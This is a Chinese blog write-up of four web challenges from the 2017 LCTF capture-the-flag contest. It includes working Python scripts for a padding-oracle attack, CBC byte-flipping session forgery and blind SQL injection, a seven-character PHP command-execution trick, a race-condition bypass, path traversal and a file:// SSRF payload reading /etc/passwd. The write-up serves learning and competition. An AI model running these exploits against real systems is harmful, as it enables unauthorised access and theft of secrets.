---
title: 2017 LCTF WriteUp
tags:
  - CTF
  - Misc
  - Web
  - CBC字节翻转攻击
  - Padding oracle攻击
  - 注入
  - WriteUp
date: 2017-11-19 23:55:00
toc: true
talk: true
---

周末刚刚结束的LCTF，我们队一共做出了4道web，一道misc还有一道问卷调查（好气啊没抢到一血换pwnhub邀请码），感谢`吃饭去`大佬带飞~
<!-- more -->
# 前言
对本渣渣而言，本次比赛质量还是不错的，我们队做出的四道web就涉及到了`CBC字节翻转攻击`、`PaddingOracle攻击`、`sprintf格式化注入`、`sql报错注出库名表名`、`join注入出列名`、`orderby无表名注入数据`、`SSRF绕过`、`条件竞争`、`7个字符内getshell`等知识，收获颇丰
下面是4道web的WriteUp

# Simple blog
A simple blog .To discover the secret of it.
http://111.231.111.54/

## 0x00获取源码
扫一下发现存在`.login.php.swp`和`.admin.php.swp`泄露
`vim -r login.php`恢复后可以查看源码
login.php
```php
<?php
error_reporting(0);
session_start();
define("METHOD", "aes-128-cbc");
include('config.php');

function show_page(){
    echo '<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Login Form</title>
  <link rel="stylesheet" type="text/css" href="css/login.css" />
</head>
<body>
  <div class="login">
    <h1>后台登录</h1>
    <form method="post">
        <input type="text" name="username" placeholder="Username" required="required" />
        <input type="password" name="password" placeholder="Password" required="required" />
        <button type="submit" class="btn btn-primary btn-block btn-large">Login</button>
    </form>
</div>
</body>
</html>
';
}

function get_random_token(){
    $random_token = '';
    $str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
    for($i = 0; $i < 16; $i++){
        $random_token .= substr($str, rand(1, 61), 1);
    }
    return $random_token;
}

function get_identity(){
	global $id;
    $token = get_random_token();
    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);
    $_SESSION['id'] = base64_encode($c);
    setcookie("token", base64_encode($token));
    if($id === 'admin'){
    	$_SESSION['isadmin'] = 1;
    }else{
    	$_SESSION['isadmin'] = 0;
    }
}

function test_identity(){
    if (isset($_SESSION['id'])) {
        $c = base64_decode($_SESSION['id']);
        $token = base64_decode($_COOKIE["token"]);
        if($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)){
            if ($u === 'admin') {
                $_SESSION['isadmin'] = 1;
                return 1;
            }
        }else{
            die("Error!");
        } 
    }
    return 0;
}

if(isset($_POST['username'])&&isset($_POST['password'])){
	$username = mysql_real_escape_string($_POST['username']);
	$password = $_POST['password'];
	$result = mysql_query("select password from users where username='" . $username . "'", $con);
	$row = mysql_fetch_array($result);
	if($row['password'] === md5($password)){
  		get_identity();
  		header('location: ./admin.php');
  	}else{
  		die('Login failed.');
  	}
}else{
	if(test_identity()){
        header('location: ./admin.php');
	}else{
        show_page();
    }
}
?>
```
admin.php
```php
<?php
error_reporting(0);
session_start();
include('config.php');

if(!$_SESSION['isadmin']){
	die('You are not admin');
}

if(isset($_GET['id'])){
	$id = mysql_real_escape_string($_GET['id']);
	if(isset($_GET['title'])){
		$title = mysql_real_escape_string($_GET['title']);
		$title = sprintf("AND title='%s'", $title);
	}else{
		$title = '';
	}
	$sql = sprintf("SELECT * FROM article WHERE id='%s' $title", $id);
	$result = mysql_query($sql,$con);
	$row = mysql_fetch_array($result);
	if(isset($row['title'])&&isset($row['content'])){
		echo "<h1>".$row['title']."</h1><br>".$row['content'];
		die();
	}else{
		die("This article does not exist.");
	}
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>adminpage</title>
	<link href="css/bootstrap.min.css" rel="stylesheet">
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
</head>
<body>
	<nav class="navbar navbar-default" role="navigation">
   <div class="navbar-header">
      <a class="navbar-brand" href="#">后台</a>
   </div>
   <div>
      <ul class="nav navbar-nav">
         <li class="active"><a href="#">编辑文章</a></li>
         <li><a href="#">设置</a></li>
      </ul>
   </div></nav>
   <div class="panel panel-success">
   <div class="panel-heading">
      <h1 class="panel-title">文章列表</h1>
   </div>
   <div class="panel-body">
      <li><a href='?id=1'>Welcome to myblog</a><br></li>
      <li><a href='?id=2'>Hello,world!</a><br></li>
      <li><a href='?id=3'>This is admin page</a><br></li>
   </div>
   </div>
</body>
</html>
```
可以看到这道题分为两个部分，第一部分管理员登录，第二部分大概率是个注入

## 0x01管理员登录
测试发现`admin=123&password[]=111`或者直接`弱口令admin、admin`可以直接登录并跳转到`admin.php`，但是却提示不是真正的admin，查看admin.php源码，发现只有`$_SESSION['isadmin']`存在时，才算真正的管理员
而login.php中有关session的操作，就涉及到`get_identity()`和`test_identity()`两个函数
```php
function get_identity(){
	global $id;
    $token = get_random_token();
    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);
    $_SESSION['id'] = base64_encode($c);
    setcookie("token", base64_encode($token));
    if($id === 'admin'){
    	$_SESSION['isadmin'] = 1;
    }else{
    	$_SESSION['isadmin'] = 0;
    }
}

function test_identity(){
    if (isset($_SESSION['id'])) {
        $c = base64_decode($_SESSION['id']);
        $token = base64_decode($_COOKIE["token"]);
        if($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)){
            if ($u === 'admin') {
                $_SESSION['isadmin'] = 1;
                return 1;
            }
        }else{
            die("Error!");
        } 
    }
    return 0;
}
```
这两个函数和2017NJCTF的一道cbc字节翻转题几乎一模一样，这里我参考了[Pr0ph3t](http://www.jianshu.com/p/7f171477a603)大佬的文章，通过构造特定的token(IV)进行`CBC字节翻转攻击`，使得服务器解出来的明文为`admin`，
但是这里不知道 `id`的值  
再参考[FreeBuff](http://www.freebuf.com/vuls/98156.html)的这篇文章，通过构造特定的token，也就是IV，利用`test_identity()`函数导致的页面返回不同进行`PaddingOracle攻击`，从而推导出中间值，然后求出明文，也就是`id`
总结一下，第一部分我们要做的有以下这几步
```
1.弱口令登录
2.PaddingOracle攻击得到id
3.CBC字节翻转攻击伪造成真正的admin
```

PaddingOracle攻击脚本如下
```python
#!/usr/bin/python
#-*- coding: utf-8 -*-
#by:CodeMonster
import requests as r1
import base64
flag=''
url="http://111.231.111.54/login.php"
token=base64.b64decode("N2ZtWmZjSWJmaUtRNFNSeg==")
id=''
idhex=''
n=15
for j in range(16):
    for i in range(16*16):
        ok=''
        for k in flag:
            ok+=chr((j+1)^ord(k))
        ss=(15-j)*'\x00'+chr(i)+ok
        s=base64.b64encode(ss)
        header={"Cookie": "PHPSESSID=0t4h76nv16i4m61noh2gli2nd5; token="+s+";"}
        r2=r1.get(url,headers=header)
        #print r2.text
        if "Error" not in r2.text:
            #print (i^(j+1)),i,j
            flag=chr(i^(j+1))+flag
            id=chr((i^(j+1))^(ord(token[15-j])))+id
            idhex=hex((i^(j+1))^(ord(token[15-j])))+"-"+idhex
            print j,id
            print j,idhex
            break
```
其中token和cookie要修改成第一步登录成功后的token和cookie，最后能求出14位id和一位0x01，可以爆破最后一位

CBC字节翻转攻击脚本
```python
#!/usr/bin/python
#-*- coding: utf-8 -*-
#by:CodeMonster
import base64 as b64
import binascii
dic = open("passsss.txt","a")
for i in range(256):
    source_str = chr(i)+'EZKIhn1dPhWY2P'+'\x01'
    target_srt = 'admin' + 11 * '\x0b'
    token = 'cWMzdTJQMUxGSmJSRmt5Vw==' #你获得的初始IV的base64encode值
    token = list(b64.b64decode(token))
    for x in xrange(0,len(target_srt)):
        token[x] = chr(ord(token[x]) ^ ord(target_srt[x]) ^ ord(source_str[x]))
    sss=b64.b64encode(''.join(token))
    dic.write("".join(sss))
    dic.write("".join("\n"))
dic.close()
```
然后去burpsuite里爆破token就好，即可登录为管理员

## 0x02sql注入
这部分的核心代码主要是这几句
```php
  $id = mysql_real_escape_string($_GET['id']);
	if(isset($_GET['title'])){
		$title = mysql_real_escape_string($_GET['title']);
		$title = sprintf("AND title='%s'", $title);
	}else{
		$title = '';
	}
	$sql = sprintf("SELECT * FROM article WHERE id='%s' $title", $id);
	$result = mysql_query($sql,$con);
	$row = mysql_fetch_array($result);
	if(isset($row['title'])&&isset($row['content'])){
		echo "<h1>".$row['title']."</h1><br>".$row['content'];
		die();
	}else{
		die("This article does not exist.");
  }
```
看到用了sprintf格式化字符串，想到[省赛的注入题](https://www.codemonster.cn/2017/10/31/2017-3th-fjwlkjaqds-writeup/)
测试了一下`%1$'`可以成功逃逸单引号，构造盲注脚本如下，在web1.key的f14g字段找到flag

```python
#!/usr/bin/python
#-*- coding: utf-8 -*-
#by:CodeMonster
import re
import requests as r
payload=list("ABCDEFGHIJKLMNOPQRSTUVWXYZ@1234567890qwertyuiopasdfghjklzxcvbnm_{}.!,")
data=''
flag=''
for s in range (0,50):
	for i in range (1,50):
		for p in payload:
			header={"Cookie": "PHPSESSID=b1kkq3ohuavj53kkl4u29dg914; token=SUIEVxUzVHYpEQEOFFIiXQ==;"}
			url="http://111.231.111.54/admin.php?id=1&title="
			#url+="%1$%27%20or%20(ascii(mid((select%20group_concat(column_NAME)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=database()%20and%20table_name=0x6b6579),{0},1))={1})%23".format(i,ord(p))
			url+="%1$%27%20or%20(ascii(mid((select%20f14g%20from%20web1.key),{0},1))={1})%23".format(i,ord(p))
			#print url
			r1=r.get(url,headers=header)
			#print r1.text
			if "myblog" in r1.text:
				flag+=p
				print i,flag
				break
print flag
```

# "他们"有什么秘密呢?
一个简单到不能再简单的......
http://182.254.246.93/

index.php
```
1.entrance.php
2.There is no need to scan and brute force!
3.Hacking for fun!
```

## 0x00各种注入骚操作得到下一关文件名
entrance.php存在报错注入  
构造`1 and linestring(pro_id)`得到表名`product_2017ctf`和数据库名`youcanneverfindme17`   
通过join注入得到字段名`d067a0fa9dc61a6e`
```
pro_id=1 and (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner)) as c);
```
但是这个字段名被ban了，只好通过order by来得到d067a0fa9dc61a6e字段的内容，脚本如下
```python
#!/usr/bin/python
#-*- coding: utf-8 -*-
#by:CodeMonster
import requests
r=requests.session()
url="http://182.254.246.93/entrance.php?"
l=".0123456789abcdefghijklmnopqrstuvwxyz"
k=""
sec=""
for i in range(36):
	for j in range(len(l)):
		payload=sec+l[j]
		data={"pro_id":"3 union select 1,'test',4,'{}' from product_2017ctf order by 4".format(payload)}
		r1=r.post(url,data=data)
		if 'nextentrance' in r1.text:
			sec+=k
			print payload
			break
		k=l[j]
		if j==len(l)-1:
			sec+=k
```
得到的内容和字段名拼接得到`d067a0fa9dc61a6e7195ca99696b5a896.php`

## 0x01七个字符getshell
d067a0fa9dc61a6e7195ca99696b5a896.php是个类似上传的页面，可以在服务器的一个专属文件夹生成指定文件名和内容的文件，一开始以为可以通过`content[]`绕过长度限制，无果，然后google到了原题
http://c.colabug.com/article-2421-1.html
传三个文件
```
文件名    内容
bash      随意
bb        7个字符内的命令
z.php     <?=`*`;
```
`z.php`中的``<?=`*`;``刚好7个字符，访问后能把当前目录下的所有文件按字母顺序列出，然后执行。
传好上面3个文件后，当前文件夹就有4个文件了，按字母排序如下
```
bash bb index.html(题目自带) z.php
```
访问z.php后，相当于执行了`bash bb index.php z.php`
所以我们只需要通过修改bb来执行7个字符以内的命令
bb的内容分别为`ls /`和`cat /3*`
![](/img/2017lctf1.png) 


# 萌萌哒报名系统
天依花了一整天的时间用IDE开发了一个报名系统，现在她睡着了，难道你们不想做点什么嘛XD?
http://123.206.120.239/

## 0x00下载源码
提示了IDE开发  
扫到了`http://123.206.120.239/.idea/workspace.xml`
![](/img/2017lctf5.png) 
下载到了源码
login.php
```php
<?php
	session_start();
	include('config.php');
	try{
		$pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass);
	}catch (Exception $e){
		die('mysql connected error');
	}
	$username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');
    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');

    if (strlen($username) > 32 || strlen($password) > 32) {
        die('Invalid input');
    }

    $sth = $pdo->prepare('SELECT password FROM users WHERE username = :username');
    $sth->execute([':username' => $username]);
    if ($sth->fetch()[0] !== $password) {
        die('wrong password');
    }
    $_SESSION['username'] = $username;
	unset($_SESSION['is_logined']);
	unset($_SESSION['is_guest']);
	#echo $username;
	header("Location: member.php");
?>
```
member.php
```php
<?php
	error_reporting(0);
	session_start();
	include('config.php');
	if (isset($_SESSION['username']) === false) {
        die('please login first');
    }
	try{
		$pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass);
	}catch (Exception $e){
		die('mysql connected error');
	}
    $sth = $pdo->prepare('SELECT identity FROM identities WHERE username = :username');
    $sth->execute([':username' => $_SESSION['username']]);
    if ($sth->fetch()[0] === 'GUEST') {
        $_SESSION['is_guest'] = true;
    }

    $_SESSION['is_logined'] = true;
	if (isset($_SESSION['is_logined']) === false || isset($_SESSION['is_guest']) === true) {
        
    }else{
		if(isset($_GET['file'])===false)
			echo "None";
		elseif(is_file($_GET['file']))
			echo "you cannot give me a file";
		else
			readfile($_GET['file']);
	}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head>
<body background="./images/1.jpg">
<object type="application/x-shockwave-flash" style="outline:none;" data="http://cdn.abowman.com/widgets/hamster/hamster.swf?" width="300" height="225"><param name="movie" value="http://cdn.abowman.com/widgets/hamster/hamster.swf?"></param><param name="AllowScriptAccess" value="always"></param><param name="wmode" value="opaque"></param></object>
<p style="color:orange">你好啊，但是你好像不是XDSEC的人,所以我就不给你flag啦~~</p>
</body>
</html>
```
register.php
```php
<?php
	include('config.php');
	try{
		$pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass);
	}catch (Exception $e){
		die('mysql connected error');
	}
	$admin = "xdsec"."###".str_shuffle('you_are_the_member_of_xdsec_here_is_your_flag');
    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');
    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');
    $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : '';

    if (strlen($username) > 16 || strlen($username) > 16) {
        die('Invalid input');
    }

    $sth = $pdo->prepare('SELECT username FROM users WHERE username = :username');
    $sth->execute([':username' => $username]);
    if ($sth->fetch() !== false) {
        die('username has been registered');
    }

    $sth = $pdo->prepare('INSERT INTO users (username, password) VALUES (:username, :password)');
    $sth->execute([':username' => $username, ':password' => $password]);

    preg_match('/^(xdsec)((?:###|\w)+)$/i', $code, $matches);
    if (count($matches) === 3 && $admin === $matches[0]) {
        $sth = $pdo->prepare('INSERT INTO identities (username, identity) VALUES (:username, :identity)');
        $sth->execute([':username' => $username, ':identity' => $matches[1]]);
    } else {
        $sth = $pdo->prepare('INSERT INTO identities (username, identity) VALUES (:username, "GUEST")');
        $sth->execute([':username' => $username]);
    }
  echo '<script>alert("register success");location.href="./index.html"</script>';
```

## 0x01竞争绕过身份检测
一开始一直以为要预测`str_shuffle()`打乱的字符串，无果，分析代码发现注册的时候是先将`用户名密码插入数据库`，再判断注册码是否正确，然后插入用户身份，而member.php中判断用户身份的逻辑用的是
```php
if ($sth->fetch()[0] === 'GUEST') {
  $_SESSION['is_guest'] = true;
}
```
只要不为`GUEST`即可执行后面的代码
想到通过竞争，在`GUEST`还没更新进数据库的时候就登录并访问member.php，从而跳过身份验证
这里我的操作是
```
1.burpsuite Intruder无限POST login.php进行登录操作
2.burpsuite Intruder无限GET member.php
3.在前面两个都在跑的情况下注册一个账号
```
要注意的是三个操作的cookie必须相同，1和3中的账号密码要相同，这样在注册的同时就完成了登录操作并且访问了member并绕过身份检测可以执行下一部分代码
emmmmmmmm，看了操作和flag的内容，感觉我用了非预期解，预期解应该是通过输入超长的`xdsec###`开头的字符串让regiest.php中的正则匹配函数崩溃，从而无法注入用户GUEST身份，后面的就都一样了

## 0x02文件包含读取config.php
关键代码如下
```php
if(isset($_GET['file'])===false)
	echo "None";
elseif(is_file($_GET['file']))
	echo "you cannot give me a file";
else
  readfile($_GET['file']);
```
这里构造
```
?file=./x/../config.php
```
因为x文件夹不存在，所以就能绕过`is_file()`读取到`config.php`，flag就在里面
![](/img/2017lctf6.png) 

# 签到题
这是一个拼手速抢邀请码的题
http://211.159.161.162/test.php
hint: 本地

这道题相对没前面的复杂，fuzz发现只能提交`协议名://www.baidu.com`这样的值，否则error
构造
```
?site=file://www.baidu.com/etc/passwd%23
```
成功读取`/etc/passwd`，发现lctf用户，再用相同方法读取`/home/lctf/flag`得到flag
![](/img/2017lctf3.png) 
 
# 总结
周末打了两天还是学到了很多骚操作，但是没有逆向和pwn的分数所以分数差很多，最后还是膜一下各位大佬们~
